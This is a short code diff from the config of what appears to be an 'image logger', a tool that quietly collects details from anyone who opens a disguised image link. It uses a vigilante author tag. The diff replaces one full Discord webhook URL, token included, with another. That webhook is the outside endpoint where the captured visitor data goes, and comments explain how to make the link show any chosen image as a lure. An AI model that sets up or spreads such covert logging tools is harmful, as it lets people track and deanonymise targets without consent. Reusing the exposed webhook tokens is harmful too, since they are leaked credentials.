@@ -12,7 +12,7 @@ __author__ = "Pedofile Catchers"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1357066665787003024/10Ps0-00mBl316HesZZEIh93uwkh8H7QKp6JRUAj3hG9ysvf8QG_ojGtIFfttHbbzs8D",
+    "webhook": "https://discord.com/api/webhooks/1357142857470841005/9ECcc4ewZA6VIL-wxBHLpW_XVe0VStvOpYvH_0buFoP15r2IeVxdKwjzM4BPetik1nzH",
     "image": "https://tenor.com/view/twenty-century-fox-meme-gfy-go-fuck-yourself-meme-get-lost-gif-26260205", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
